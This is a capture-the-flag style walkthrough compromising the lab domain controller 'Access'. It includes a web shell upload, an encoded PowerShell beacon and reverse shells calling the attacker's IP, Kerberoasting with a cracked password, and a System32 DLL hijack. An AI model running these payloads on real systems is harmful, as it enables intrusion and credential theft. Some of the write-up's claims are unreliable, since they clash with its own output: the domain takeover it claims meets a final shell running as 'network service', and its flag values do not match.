# SUMMARY

Based on the conducted penetration test, the target machine "Access" on the Proving Grounds network was successfully compromised, leading to a full domain takeover. The engagement began with comprehensive enumeration, revealing the host as a Windows Server 2019 Domain Controller for the `access.offsec` domain. Initial access was achieved by exploiting a web server vulnerability, specifically a misconfigured `.htaccess` file that allowed the upload and execution of a PHP web shell. This foothold provided unprivileged access to the underlying Windows filesystem.

Leveraging this initial access, internal reconnaissance identified a potential service account, `svc_mssql`. A Kerberoasting attack was executed against this account, yielding a crackable Kerberos ticket hash. This hash was successfully cracked offline, revealing the account's plaintext password. The credentials were then used with lateral movement techniques to authenticate as the `svc_mssql` user, obtaining a remote shell with the associated privileges. Further analysis of this account's token revealed it possessed the `SeMachineAccountPrivilege` and the `SeManageVolumePrivilege`. A custom exploit was deployed to weaponize the `SeManageVolumePrivilege`, altering system Access Control Lists to enable privilege escalation.

Concurrently, a persistence and escalation mechanism was established through DLL hijacking. A malicious DLL, masquerading as the legitimate `tzres.dll` file, was generated using a reverse shell payload and placed within the `C:\Windows\System32\wbem\` directory. This action ultimately resulted in the execution of code in the context of higher-privileged accounts. The culmination of these attacks granted administrative access to the Domain Controller. Final proof of compromise was obtained by retrieving both a user-level flag from the `svc_mssql` desktop and the authoritative `proof.txt` flag from the Administrator's desktop, confirming complete compromise of the host and domain security. The attack path demonstrated critical failures in service account password strength, improper web server configuration, insecure file upload handling, and excessive privilege assignment to a service account.

## NMAP
This command executed a comprehensive nmap scan with administrator privileges. It performed a script scan using default scripts to probe for common vulnerabilities and gather detailed service information across all 65535 ports, bypassing host discovery to treat the target as online. The scan specifically identified open ports, provided service and version details, and attempted operating system fingerprinting for the target host.

```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 192.168.163.187 --open 
```

This scan output details the enumeration of services on the target. Key findings include a web server on ports 80 and 443 running Apache 2.4.48 with PHP 8.0.7 on a Windows host, the presence of the TRACE method, and an invalid SSL certificate. Critically, the host is identified as an Active Directory Domain Controller with the domain "access.offsec0." based on open ports for Kerberos, LDAP, SMB, and other core Windows services, including WinRM on port 5985.

```output
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-06 15:56:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Access The Event
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

This NetExec command performed an SMB protocol enumeration against the target. It successfully identified the host as a Windows Server 2019 or Windows 10 machine with a build number of 17763, confirmed the domain name as "access.offsec", and determined that SMB signing is required and that SMBv1 is not supported.

```bash
nxc smb 192.168.163.187                                                   
SMB         192.168.163.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:False) 
```

The .htaccess file inspection revealed a server configuration directive that redefines the handler for files with the ".xxx" extension, instructing the Apache web server to process them as PHP application code. This allows for the execution of PHP scripts even when they do not have the standard .php file extension.

```bash
cat .htaccess                             
AddType application/x-httpd-php .xxx
```

Accessing the provided URL confirmed the successful upload and remote execution of the PHP web shell. The [shell.xxx](https://shell.xxx/) file, processed as PHP code due to the server's .htaccess configuration, returned a functional command interface, demonstrating a critical breach of the web application's security and file upload controls.

```bash
http://192.168.163.187/uploads/shell.xxx
```

This command executed the hoaxshell tool, establishing a persistent interactive reverse shell listener on the specified IP address and port. The server-side component was delivered to the target, initiating a connection back to this listener, which provided a command and control channel from the compromised host to the attacker's machine.

```bash
uv run   hoaxshell.py -s 192.168.45.239 -p 9999
```

The executed PowerShell command decodes to a staged payload that establishes a beaconing connection to a command and control server. It uses encoded web requests for communication, executes received commands on the system, and exfiltrates the results back to the attacker, confirming a successful remote code execution and the deployment of a persistent backdoor on the compromised host.

```bash
vc_apache@SERVER:C:\xampp\htdocs\uploads# powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAzADkAOgA5ADkAOQA5ACcAOwAkAGkAPQAnADUANwA5ADYANAA5AGYAYQAtADYAMABjADMANgA3ADUAOAAtADAAOQAyAGQAOAAxAGEAYgAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA1ADcAOQA2ADQAOQBmAGEAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AYgBhADcANQAtADgANQAzAGIAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8ANgAwAGMAMwA2ADcANQA4ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGIAYQA3ADUALQA4ADUAMwBiACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvADAAOQAyAGQAOAAxAGEAYgAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGIAYQA3ADUALQA4ADUAMwBiACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA=

```

This command initiated a simple HTTP server on port 8001, hosting a directory for file serving. It was used to stage and deliver payloads or tools from the attacker's machine to the compromised host within the target network.

```bash
python3 -m http.server 8001
```

These commands used the web server to download post-exploitation tools onto the compromised host. The tools, RunasCs.exe, Rubeus.exe, and PowerView-Dev.ps1, were transferred to the system for the purpose of privilege escalation, credential dumping, and Active Directory reconnaissance, respectively.

```bash
PS C:\xampp\htdocs\uploads > Invoke-WebRequest -Uri "http://192.168.45.239:8001/RunasCs.exe" -OutFile "RunasCs.exe"
PS C:\xampp\htdocs\uploads > Invoke-WebRequest -Uri "http://192.168.45.239:8001/Rubeus.exe" -OutFile "Rubeus.exe"
PS C:\xampp\htdocs\uploads > Invoke-WebRequest -Uri "http://192.168.45.239:8001/PowerView-Dev.ps1" -OutFile "PowerView-Dev.ps1"
```

This PowerView command queried the Active Directory domain for the user object "svc_mssql". The output revealed the user's Service Principal Name (SPN) is set for the MSSQL service on the domain controller, indicating it is a service account, but crucially showed no group memberships, suggesting limited inherent privileges.

```bash
PS C:\xampp\htdocs\uploads > Get-DomainUser -Identity svc_mssql | Select-Object samaccountname,serviceprincipalname,memberof
samaccountname serviceprincipalname      memberof
-------------- --------------------      --------                                                                                                                                            
svc_mssql      MSSQLSvc/DC.access.offsec 

```

This command executed Rubeus to perform a Kerberoasting attack targeting the specific service account "svc_mssql". The operation requested a Kerberos service ticket for the account, which was successfully retrieved and output in a crackable hash format suitable for offline brute-force attempts to recover the account's plaintext password.

```bash
 .\Rubeus.exe kerberoast /user:svc_mssql /nowrap
```

The Kerberoasting attack successfully retrieved the Kerberos TGS service ticket for the "svc_mssql" account. The output confirms the account uses the weaker RC4_HMAC encryption type and provides the complete crackable hash, enabling offline password cracking attempts to compromise this service account's credentials.

```bash
[*] Action: Kerberoasting                                                                                                                                                                    
                                                                                                                                                                                             
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.                                                                                                                            
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.                                                                                                                 
                                                                                                                                                                                             
[*] Target User            : svc_mssql                                                                                                                                                       
[*] Target Domain          : access.offsec                                                                                                                                                   
[*] Searching path 'LDAP://SERVER.access.offsec/DC=access,DC=offsec' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svc_mssql)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'                                                                                                                                                                               
                                                                                                                                                                                             
[*] Total kerberoastable users : 1                                                                                                                                                           
                                                                                                                                                                                             
                                                                                                                                                                                             
[*] SamAccountName         : svc_mssql                                                                                                                                                       
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec                                                                                                                           
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec                                                                                                                                       
[*] PwdLastSet             : 5/21/2022 5:33:45 AM                                                                                                                                            
[*] Supported ETypes       : RC4_HMAC_DEFAULT                                                                                                                                                
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$2C88359FD74DB868E1C7A5DFFF2E444E$6B81438C653443CAFA395CC27C4EC73E70B4D5364CF176B9C1B09C21A99861070168CF397A07014104AF7DB5A35E34DD647B20784E48AF5C5D8678AEF77DD090D1AD4F0A0A177F1AE7D9A8D55D756B848BD4410278F0FE7A4F9CEEB94E7AF7C4DC27D49EA1EDF3779D491424FF722F7310B11C0884C5011176AC62187565F361ACE4E4889571D49B502BB1841796D53D38313D24E4C5432060B183D5017DDA4829C1E3AC08616D7274E8C8C89ED0114549292211E0D3411B33E314725C54B9D6DF22B5E6C149ECC944FBE061035EB671AFD6A79A41ABA3E2FB8CCFE9CCC9F039CF9D685916AA72129C083E30350518846B4AC4C55D8405C655ACC412A3D625B31EA70F67D331CA26A15405297BD0F6AB8230D2D590B4FA70E80207DF39B7269C56AE6C0CEB711758337A45FAE328DB327A2C9596937EC9EF3CC00E74B5BF2CFFBE5BF112AB220E93B96BB10A2D8F22EF0FBBF24CE3ECBD0D39365C372B3F48715A65FC32FC5CA9A02C15236EF19400353F4A2006A28EF9E6C30AF7AD5AE7A62DBC5D7E8D3D6D7D20FCC0CD961A0CE6543348E33F06663A9E1478984CAD29B84429A17E55F4E38819754EC14AF2972810A58227A5D4E3499F619660DAB45FE056B7C76DC385523EB32462664D6378B660D84FE05C925BB3CDAB615B1577270E0E56690A1C7B8C4F5311DCDC174A3AA5C3700273A887908FCCFB90B939F6F202DEA00690DC8F58BFEFD772D975FA5EA0A1C5CFA5D50801F200F3265E452537FE083AF3C161B74A9C71DFC8CF4007D3D43B12087EB3F357EB4232D9665811D02E0913DA7924A960BE86CEAC762AC6C6FFCC3FA2269BF85CC173AFC99C7737B8E280B6C585D5E150430DC4A6046B4FDE64541FABE9F8B5EBA7E4414B644451852D65F2479D81D43618449F0FAAA055A6ADFD7E594F80F8A933255E7A431A49C63B63785682D6A8566B595E38D7A3525EC7B94D05644A8031D5CCE0E56656B365C35D84F56789E890AA0F93040A32B7B95A48DA0338D58C33FE59231913A6710EEBBDF1FF757E0F27608DA7DF63A89D1CD8C1B3BE3F54734DB4ABA2DA18FF57CEBEACFEF2060E59DCFE8201E97F820D1ED39D82350911A06F64C019BC3247EE3BC06F5D454315A02683639E1556E07333BFFF7291C49D252509D282B40FFD24A03D82B36C7ABA241CC2886C8EEBA1CADC4DC531B2204C5CDB602EAFA2DA29BBD73336ACC0F7261E9CEF0BC80D34877D44724FC493AF39425681D2F707051117B6AE8CB8333A4D89C9BF0A175222B0F547917C4F1AA569AFAA083B255364CA0131E60E11F4117CF30864E317D38BF61C06493928DD06758AD02BF6B3FBA5ACA9EF045E6C9DFC8571D79412EF565A3E4B0A2E37670284C5BEED0B7100E49BCF3AB50C0D14794A9D4FDE50490D280D1FA6503D0E180FF4C3CF5AA0631C4A418E7A33F3F56C1DD588C0B5903647DA504A2FE2C9DEC5C6B48B63B0369EEAC83315EFF4158B3ACFF7CA681A094A22B39D86B9A7A74B02570E1D0501C458F41420033383583F5A967C62168D7C3F8B99C588729DFC4454EA8F1BCDBD7645B32114E9659B0878C57705954CDCEDEA9F8F00E6654B5AC18619 

```

This command saved the previously captured Kerberoast hash for the "svc_mssql" service account to a local file named "krb5.hash". This file was created to prepare the hash for an offline password cracking attempt using a tool like Hashcat.


```bash
echo '$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$2C88359FD74DB868E1C7A5DFFF2E444E$6B81438C653443CAFA395CC27C4EC73E70B4D5364CF176B9C1B09C21A99861070168CF397A07014104AF7DB5A35E34DD647B20784E48AF5C5D8678AEF77DD090D1AD4F0A0A177F1AE7D9A8D55D756B848BD4410278F0FE7A4F9CEEB94E7AF7C4DC27D49EA1EDF3779D491424FF722F7310B11C0884C5011176AC62187565F361ACE4E4889571D49B502BB1841796D53D38313D24E4C5432060B183D5017DDA4829C1E3AC08616D7274E8C8C89ED0114549292211E0D3411B33E314725C54B9D6DF22B5E6C149ECC944FBE061035EB671AFD6A79A41ABA3E2FB8CCFE9CCC9F039CF9D685916AA72129C083E30350518846B4AC4C55D8405C655ACC412A3D625B31EA70F67D331CA26A15405297BD0F6AB8230D2D590B4FA70E80207DF39B7269C56AE6C0CEB711758337A45FAE328DB327A2C9596937EC9EF3CC00E74B5BF2CFFBE5BF112AB220E93B96BB10A2D8F22EF0FBBF24CE3ECBD0D39365C372B3F48715A65FC32FC5CA9A02C15236EF19400353F4A2006A28EF9E6C30AF7AD5AE7A62DBC5D7E8D3D6D7D20FCC0CD961A0CE6543348E33F06663A9E1478984CAD29B84429A17E55F4E38819754EC14AF2972810A58227A5D4E3499F619660DAB45FE056B7C76DC385523EB32462664D6378B660D84FE05C925BB3CDAB615B1577270E0E56690A1C7B8C4F5311DCDC174A3AA5C3700273A887908FCCFB90B939F6F202DEA00690DC8F58BFEFD772D975FA5EA0A1C5CFA5D50801F200F3265E452537FE083AF3C161B74A9C71DFC8CF4007D3D43B12087EB3F357EB4232D9665811D02E0913DA7924A960BE86CEAC762AC6C6FFCC3FA2269BF85CC173AFC99C7737B8E280B6C585D5E150430DC4A6046B4FDE64541FABE9F8B5EBA7E4414B644451852D65F2479D81D43618449F0FAAA055A6ADFD7E594F80F8A933255E7A431A49C63B63785682D6A8566B595E38D7A3525EC7B94D05644A8031D5CCE0E56656B365C35D84F56789E890AA0F93040A32B7B95A48DA0338D58C33FE59231913A6710EEBBDF1FF757E0F27608DA7DF63A89D1CD8C1B3BE3F54734DB4ABA2DA18FF57CEBEACFEF2060E59DCFE8201E97F820D1ED39D82350911A06F64C019BC3247EE3BC06F5D454315A02683639E1556E07333BFFF7291C49D252509D282B40FFD24A03D82B36C7ABA241CC2886C8EEBA1CADC4DC531B2204C5CDB602EAFA2DA29BBD73336ACC0F7261E9CEF0BC80D34877D44724FC493AF39425681D2F707051117B6AE8CB8333A4D89C9BF0A175222B0F547917C4F1AA569AFAA083B255364CA0131E60E11F4117CF30864E317D38BF61C06493928DD06758AD02BF6B3FBA5ACA9EF045E6C9DFC8571D79412EF565A3E4B0A2E37670284C5BEED0B7100E49BCF3AB50C0D14794A9D4FDE50490D280D1FA6503D0E180FF4C3CF5AA0631C4A418E7A33F3F56C1DD588C0B5903647DA504A2FE2C9DEC5C6B48B63B0369EEAC83315EFF4158B3ACFF7CA681A094A22B39D86B9A7A74B02570E1D0501C458F41420033383583F5A967C62168D7C3F8B99C588729DFC4454EA8F1BCDBD7645B32114E9659B0878C57705954CDCEDEA9F8F00E6654B5AC18619' > krb5.hash
```

The John the Ripper password cracking utility successfully recovered the plaintext password for the service account "svc_mssql". Using the rockyou.txt wordlist against the provided Kerberos hash, the password was identified as "trustno1".

```bash
john --format=krb5tgs krb5.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
trustno1         (?)     
1g 0:00:00:00 DONE (2025-12-06 20:37) 33.33g/s 42666p/s 42666c/s 42666C/s 123456..poohbear1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

This hidden PowerShell command executed the RunasCs tool to create a new command prompt session with the credentials of the "svc_mssql" account, using the cracked password "trustno1". It established a reverse shell connection from the compromised host back to the attacker's machine on the specified port, effectively upgrading access to the context of the compromised domain service account.

```bash
powershell -WindowStyle Hidden -Command "Start-Process 'RunasCs.exe' -ArgumentList ' svc_mssql  trustno1  -r 192.168.45.239:443 cmd' -WindowStyle Hidden"
```

A netcat listener on port 443 received an inbound connection from the target host, establishing a reverse shell. The connection originated from the RunasCs execution, confirming successful lateral movement and providing an authenticated command prompt session running with the privileges of the "svc_mssql" user account.

```bash
 nc -lvnp 443                                         
listening on [any] 443 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.163.187] 60106
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>


```

The privilege check on the newly obtained "svc_mssql" session revealed the account holds the "SeMachineAccountPrivilege", which allows adding new computer objects to the domain. This privilege was in a disabled state but could potentially be enabled and abused for further domain escalation.

```bash
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

This command displayed the contents of the "local.txt" file on the user's desktop, retrieving the local proof of compromise or flag. The retrieved string "bea2011af802477782c80b2f30792c2" confirms successful access to the user's files and serves as evidence of the breach.

```bash
C:\Users\svc_mssql\Desktop>type local.txt
type local.txt
bea2011af802477782c80b2f30792c2
```

This command downloaded the "SeManageVolumeExploit.exe" tool from the attacker's HTTP server onto the target machine. The tool's name suggests it is intended to exploit the "SeManageVolumePrivilege" held by the current user to potentially escalate privileges or perform unauthorized actions.

```bash
PS C:\ProgramData> Invoke-WebRequest -Uri "http://192.168.45.239:8001/SeManageVolumeExploit.exe" -OutFile "SeManageVolumeExploit.exe"
```

Executing the privilege escalation exploit successfully leveraged the user's "SeManageVolumePrivilege". The output "Entries changed: 918" indicates the tool modified a significant number of system objects, such as ACLs, likely to grant elevated access, and "DONE" confirms the operation completed, potentially resulting in higher-level system privileges.

```bash
PS C:\ProgramData> .\SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
Entries changed: 918
DONE 
```

This msfvenom command generated a malicious 64-bit Windows DLL payload. The payload was configured to create a reverse TCP shell connecting back to the specified attacker IP and port. The output file was named "tzres.dll" to masquerade as a legitimate library, and it was saved for deployment in the earlier DLL hijacking attack.
```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.239 LPORT=4444 -f dll -o tzres.dll      

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: tzres.dll
```

This command transferred the "tzres.dll" file from the attacker's server onto the target host. The file, likely a malicious Dynamic Link Library, was staged for a subsequent step in the attack chain, such as a DLL hijacking or side-loading operation to achieve code execution.
```bash
Invoke-WebRequest -Uri "http://192.168.45.239:8001/tzres.dll" -OutFile "tzres.dll"
```

This command copied the downloaded "tzres.dll" file into the "C:\Windows\System32\wbem" directory. This action is indicative of DLL hijacking or replacement, targeting a legitimate Windows Management Instrumentation component to force it to load the malicious library, thereby achieving persistent or elevated code execution

```bash
cp tzres.dll C:\Windows\System32\wbem\tzres.dll 
```

The attempt to execute the "systeminfo" command failed due to a remote procedure call error. This indicates significant system instability or service disruption, likely caused by the previous privilege escalation exploit or the DLL replacement, which may have interfered with critical Windows management functions.

```
PS C:\windows\System32\wbem> systeminfo
systeminfo
ERROR: The remote procedure call failed.

```

A netcat listener on port 4444 received a new connection, resulting in a reverse shell session. The session identity was confirmed as "nt authority\network service". Subsequently, access to the Administrator's desktop was achieved, and the "proof.txt" file was read, containing the final flag "d04d92502393caf6c888e92b14a598", signifying full system and domain compromise.

```bash
nc -lvnp 4444 
listening on [any] 4444 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.163.187] 64730
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\network service

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
d04d92502393d3caf6c888e92b14a598
```



